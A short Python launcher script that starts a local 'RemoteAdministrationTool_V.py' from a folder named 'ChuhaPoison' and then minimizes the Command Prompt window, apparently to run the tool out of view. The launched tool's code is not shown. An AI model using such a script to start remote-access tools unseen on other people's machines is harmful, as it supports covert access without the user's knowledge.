

import os
import subprocess
import pyautogui
import pygetwindow as gw
import time

def run_program():
    try:
        subprocess.Popen(['python', 'C:/Users/asus/Desktop/ChuhaPoison_2/ChuhaPoison/RemoteAdministrationTool_V.py'], shell=True)
    except Exception as e:
        print(f"Error: {e}")

def minimize_cmd():
    try:
        cmd_window = gw.getWindowsWithTitle('Command Prompt')[0]
        cmd_window.minimize()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    run_program()
    time.sleep(2)  # Adjust this delay as needed
    minimize_cmd()
